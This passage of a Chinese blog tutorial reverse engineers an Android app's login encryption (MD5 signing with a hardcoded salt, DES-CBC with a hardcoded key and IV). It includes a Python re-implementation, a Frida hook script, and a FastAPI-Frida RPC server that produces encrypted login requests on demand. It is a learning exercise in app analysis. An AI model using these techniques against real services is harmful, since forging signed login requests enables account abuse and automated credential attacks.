class="line">&#125;</span><br></pre></td></tr></table></figure><p>在初始化Cipher函数中，会获取一个MD5，然后将secKey推进去，之后调用DES的获取密钥的函数将dsk截断，之后使用MD5后的Key和原始IV进行DES加密，加密模式为<code>DES/CBC/PKCS5Padding</code></p><p>因此整个流程是：先将<code>equtype</code>、<code>loginImei</code>、<code>timeStamp</code>、<code>userPwd</code>、<code>username</code>和<code>key</code>拼接起来，只有<code>userPwd</code>和<code>username</code>是用户传入的然后剩下是时间戳或固定的设备参数或者硬编码，之后将其MD5后拼接到<code>sign</code>的<code>value</code>，作为新的<code>map</code>，之后将<code>Key</code>进行一次<code>MD5</code>然后将其和原本的<code>IV</code>作为密钥对新的<code>map</code>进行加密，得到的就是最后的<code>Encrypt</code></p><h3 id="算法还原"><a href="#算法还原" class="headerlink" title="算法还原"></a>算法还原</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">sign_string=<span class="string">&#x27;equtype=ANDROID&amp;loginImei=Android352689080920725&amp;timeStamp=1759501463192&amp;userPwd=12345678 &amp;username=12345678901&amp;key=sdlkjsdljf0j2fsjk&#x27;</span>;</span><br><span class="line">md5_sign=hashlib.md5(sign_string.encode()).hexdigest().upper()</span><br><span class="line"><span class="comment"># print(md5_string)</span></span><br><span class="line"></span><br><span class="line">user_string=<span class="string">&#x27;&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;&#x27;</span>+<span class="built_in">str</span>(md5_sign)+<span class="string">&#x27;&quot;,&quot;timeStamp&quot;:&quot;1759501463192&quot;,&quot;userPwd&quot;:&quot;12345678 &quot;,&quot;username&quot;:&quot;12345678901&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;user_string=<span class="subst">&#123;user_string&#125;</span>&quot;</span>)</span><br><span class="line">key_string = <span class="string">&quot;65102933&quot;</span></span><br><span class="line">key_md5 = hashlib.md5(key_string.encode()).digest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;key_md5=<span class="subst">&#123;key_md5&#125;</span>&quot;</span>)</span><br><span class="line">key = key_md5[:<span class="number">8</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;key=<span class="subst">&#123;key&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">iv = <span class="string">&quot;32028092&quot;</span>.encode()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(iv) &lt; <span class="number">8</span>:</span><br><span class="line">    iv = iv + <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(iv))</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(iv) &gt; <span class="number">8</span>:</span><br><span class="line">    iv = iv[:<span class="number">8</span>]</span><br><span class="line">data = user_string.encode()</span><br><span class="line">padded_data = pad(data, DES.block_size)</span><br><span class="line">cipher = DES.new(key, DES.MODE_CBC, iv)</span><br><span class="line">encrypted_data = cipher.encrypt(padded_data)</span><br><span class="line">encrypted_base64 = base64.b64encode(encrypted_data).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;加密后的结果: <span class="subst">&#123;encrypted_base64&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>因为使用Python写加解密算法比较方便，因此使用python进行算法还原</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">user_string=&#123;<span class="string">&quot;equtype&quot;</span>:<span class="string">&quot;ANDROID&quot;</span>,<span class="string">&quot;loginImei&quot;</span>:<span class="string">&quot;Android352689080920725&quot;</span>,<span class="string">&quot;sign&quot;</span>:<span class="string">&quot;914CCB500B828858A16496959DE4CC7A&quot;</span>,<span class="string">&quot;timeStamp&quot;</span>:<span class="string">&quot;1759501463192&quot;</span>,<span class="string">&quot;userPwd&quot;</span>:<span class="string">&quot;12345678 &quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;12345678901&quot;</span>&#125;</span><br><span class="line">key_md5=<span class="string">b&#x27;\xc3\xd2m\xca\x86%\x97\x82\xbd\x91\x86H\x1f\x89*\xe6&#x27;</span></span><br><span class="line">key=<span class="string">b&#x27;\xc3\xd2m\xca\x86%\x97\x82&#x27;</span></span><br><span class="line">加密后的结果: </span><br><span class="line">NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT/FXC+BMD</span><br><span class="line">bmIP0xrIL5+cfhEzMXyKHy4xuh0h19w1UoI+CUlznYRWafwBDARtKnpa1J/s5fecfmKDlU6dbU70</span><br><span class="line">CC9YUEGfzovqMpwa+LSpI8uI0g8zWl8z9CGsfPmQirjlSp41/YR/AvN6QLOGCxJbcAk8Zlh2O2nR</span><br><span class="line">Z9vurSE=</span><br><span class="line"></span><br><span class="line">returnValue: </span><br><span class="line">NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT/FXC+BMD</span><br><span class="line">bmIP0xrIL5+cfhEzMXyKHy4xuh0h19w1UoI+CUlznYRWafwBDARtKnpa1J/s5fecfmKDlU6dbU70</span><br><span class="line">CC9YUEGfzovqMpwa+LSpI8uI0g8zWl8z9CGsfPmQirjlSp41/YR/AvN6QLOGCxJbcAk8Zlh2O2nR</span><br><span class="line">Z9vurSE=</span><br></pre></td></tr></table></figure><p>一毛一样！！！</p><h4 id="hook-js"><a href="#hook-js" class="headerlink" title="hook.js"></a>hook.js</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">RequestUtil</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">RequestUtil</span>);</span><br><span class="line">    <span class="title class_">RequestUtil</span>.<span class="property">encodeDesMap</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b,c</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data: &quot;</span>+a);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desKey: &quot;</span>+b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desIV: &quot;</span>+c);</span><br><span class="line">        <span class="keyword">var</span> returnValue = <span class="variable language_">this</span>.<span class="title function_">encodeDesMap</span>(a,b,c);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;returnValue: &quot;</span>+returnValue);</span><br><span class="line">        <span class="keyword">return</span> returnValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">RequestUtil</span>.<span class="property">paraMap</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.util.Map&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b,c</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;map0 类型: &quot;</span> + (a ? a.<span class="property">$className</span> : <span class="string">&quot;null&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 打印Map内容</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (a != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;map内容:&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> keySet = a.<span class="title function_">keySet</span>();</span><br><span class="line">                <span class="keyword">var</span> keyArray = keySet.<span class="title function_">toArray</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; keyArray.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">var</span> key = keyArray[i];</span><br><span class="line">                    <span class="keyword">var</span> value = a.<span class="title function_">get</span>(key);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&quot; : &quot;</span> + value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;打印Map内容时出错: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;append: &quot;</span>+b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sign: &quot;</span>+c);</span><br><span class="line">        <span class="keyword">var</span> returnValue = <span class="variable language_">this</span>.<span class="title function_">paraMap</span>(a,b,c);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;returnValue: &quot;</span>+returnValue);</span><br><span class="line">        <span class="keyword">return</span> returnValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Utils</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.util.Utils&quot;</span>)</span><br><span class="line">    <span class="title class_">Utils</span>.<span class="property">md5</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;md5: &quot;</span>+a);</span><br><span class="line">        <span class="keyword">var</span> returnValue = <span class="variable language_">this</span>.<span class="title function_">md5</span>(a);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;returnValue: &quot;</span>+returnValue);</span><br><span class="line">        <span class="keyword">return</span> returnValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="算法转发"><a href="#算法转发" class="headerlink" title="算法转发"></a>算法转发</h3><p>直接使用该App内部的Java算法来进行一个加密的操作，我们就不用进行算法的还原了，只需要调用该App的算法函数，然后提供需要的原料，通过Rpc映射到本地的一个端口上，就能实现一个Rpc远程调用该算法</p><p>使用小肩膀课程中的代码会发现会报一个错误：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;ReferenceError: &#x27;Java&#x27; is not defined\n    at hookTest (/script1.js:5)\n    at call (native)\n    at handleRpcMessage (/frida/runtime/message-dispatcher.js:39)\n    at handleMessage (/frida/runtime/message-dispatcher.js:25)&quot;</span><span class="punctuation">,</span><span class="attr">&quot;item_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这是因为<a href="https://frida.re/news/2025/05/17/frida-17-0-0-released/%E5%9C%A8%E8%BF%99%E9%87%8C%E8%AF%B4%E6%98%8Efrida17%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%8C%E6%A1%A5%E6%8E%A5%E5%99%A8%60frida-%7Bobjc,swift,java%7D-bridge%60%E4%B8%8D%E5%86%8D%E9%BB%98%E8%AE%A4%E5%8A%A0%E8%BD%BD%EF%BC%8C%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8%E5%AF%BC%E5%85%A5%EF%BC%8C%E4%BD%BF%E7%94%A8AI%E5%8E%BB%E9%87%8D%E5%86%99%E4%B8%80%E4%B8%AA">https://frida.re/news/2025/05/17/frida-17-0-0-released/在这里说明frida17的版本，桥接器`frida-{objc,swift,java}-bridge`不再默认加载，需要手动导入，使用AI去重写一个</a> Python 脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wrap_user_script</span>(<span class="params">name, script</span>):</span><br><span class="line">    <span class="keyword">if</span> script.startswith(<span class="string">&quot;📦\n&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> script</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Script.evaluate(<span class="subst">&#123;json.dumps(name)&#125;</span>, <span class="subst">&#123;json.dumps(script)&#125;</span>);&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_final_script</span>(<span class="params">raw_fragments</span>):</span><br><span class="line">    fragments = []</span><br><span class="line">    next_script_id = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> raw_fragment <span class="keyword">in</span> raw_fragments:</span><br><span class="line">        <span class="keyword">if</span> raw_fragment.startswith(<span class="string">&quot;📦\n&quot;</span>):</span><br><span class="line">            fragments.append(raw_fragment[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script_id = next_script_id</span><br><span class="line">            next_script_id += <span class="number">1</span></span><br><span class="line">            size = <span class="built_in">len</span>(raw_fragment.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            fragments.append(<span class="string">f&quot;<span class="subst">&#123;size&#125;</span> /frida/repl-<span class="subst">&#123;script_id&#125;</span>.js\n✄\n<span class="subst">&#123;raw_fragment&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;📦\n&quot;</span> + <span class="string">&quot;\n✄\n&quot;</span>.join(fragments)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_java_bridge</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;查找Java桥接器文件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> <span class="built_in">reversed</span>(sys.path):</span><br><span class="line">        <span class="keyword">if</span> path.endswith(<span class="string">&#x27;site-packages&#x27;</span>):</span><br><span class="line">            bridge_path = os.path.join(path, <span class="string">&#x27;frida_tools&#x27;</span>, <span class="string">&#x27;bridges&#x27;</span>, <span class="string">&#x27;java.js&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(bridge_path):</span><br><span class="line">                <span class="keyword">return</span> bridge_path</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果找不到，尝试其他可能的路径</span></span><br><span class="line">    <span class="keyword">import</span> frida_tools</span><br><span class="line">    frida_tools_path = os.path.dirname(frida_tools.__file__)</span><br><span class="line">    bridge_path = os.path.join(frida_tools_path, <span class="string">&#x27;bridges&#x27;</span>, <span class="string">&#x27;java.js&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(bridge_path):</span><br><span class="line">        <span class="keyword">return</span> bridge_path</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> FileNotFoundError(<span class="string">&quot;找不到Java桥接器文件，请确保frida-tools已正确安装&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的JavaScript代码</span></span><br><span class="line">user_js_code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function hookTest(username, passward)&#123;</span></span><br><span class="line"><span class="string">    var result;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var time = new Date().getTime();</span></span><br><span class="line"><span class="string">        time = &#x27;1759643230427&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var string = Java.use(&#x27;java.lang.String&#x27;);</span></span><br><span class="line"><span class="string">        var signData = string.$new(&#x27;equtype=ANDROID&amp;loginImei=Android352689080920725&amp;timeStamp=&#x27; + </span></span><br><span class="line"><span class="string">        time + &#x27;&amp;userPwd=&#x27; + passward + &#x27;&amp;username=&#x27; + username + &#x27;&amp;key=sdlkjsdljf0j2fsjk&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var Utils = Java.use(&#x27;com.dodonew.online.util.Utils&#x27;);</span></span><br><span class="line"><span class="string">        var sign = Utils.md5(signData).toUpperCase();</span></span><br><span class="line"><span class="string">        console.log(&#x27;sign: &#x27;, sign);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var encryptData = &#x27;&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;&#x27;+ </span></span><br><span class="line"><span class="string">        sign +&#x27;&quot;,&quot;timeStamp&quot;:&quot;&#x27;+ time +&#x27;&quot;,&quot;userPwd&quot;:&quot;&#x27; + passward + &#x27;&quot;,&quot;username&quot;:&quot;&#x27; + username + &#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var RequestUtil = Java.use(&#x27;com.dodonew.online.http.RequestUtil&#x27;);</span></span><br><span class="line"><span class="string">        var Encrypt = RequestUtil.encodeDesMap(encryptData, &#x27;65102933&#x27;, &#x27;32028092&#x27;);</span></span><br><span class="line"><span class="string">        console.log(&#x27;Encrypt: &#x27;, Encrypt);</span></span><br><span class="line"><span class="string">        result = Encrypt;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    return result;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rpc.exports = &#123;</span></span><br><span class="line"><span class="string">    s1nec1o: hookTest</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;message[<span class="string">&#x27;payload&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] ERROR: <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建完整的脚本</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 读取Java桥接器</span></span><br><span class="line">    bridge_path = find_java_bridge()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(bridge_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        java_bridge = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加Java到全局对象</span></span><br><span class="line">    java_bridge += <span class="string">&quot;\n\nObject.defineProperty(globalThis, &#x27;Java&#x27;, &#123; value: bridge &#125;);&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 包装用户脚本</span></span><br><span class="line">    wrapped_script = wrap_user_script(<span class="string">&quot;hookTest&quot;</span>, user_js_code)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建最终脚本</span></span><br><span class="line">    raw_fragments = [java_bridge, wrapped_script]</span><br><span class="line">    final_script = build_final_script(raw_fragments)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;脚本构建成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;脚本构建失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Frida连接</span></span><br><span class="line">devices = frida.get_usb_device(<span class="number">1000</span>)</span><br><span class="line">pid = devices.spawn(<span class="string">&#x27;com.dodonew.online&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;pid: <span class="subst">&#123;pid&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">process = devices.attach(pid)</span><br><span class="line">script = process.create_script(final_script)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">devices.resume(pid)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;应用已恢复执行&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待应用完全启动</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;等待应用完全启动...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/get_data&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">getEchoApi</span>(<span class="params">item_id: <span class="built_in">str</span>, item_user: <span class="built_in">str</span>, item_pass: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;开始处理请求: user=<span class="subst">&#123;item_user&#125;</span>, pass=<span class="subst">&#123;item_pass&#125;</span>&quot;</span>)</span><br><span class="line">        result = script.exports_sync.s1nec1o(item_user, item_pass)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item_retval&quot;</span>: result&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_msg = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;RPC调用错误: <span class="subst">&#123;error_msg&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error_msg, <span class="string">&quot;item_id&quot;</span>: item_id&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/status&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">check_status</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;ready&quot;</span>, <span class="string">&quot;frida_version&quot;</span>: frida.__version__&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uvicorn.run(app=app, host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>增加部分的详细说明：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wrap_user_script</span>(<span class="params">name, 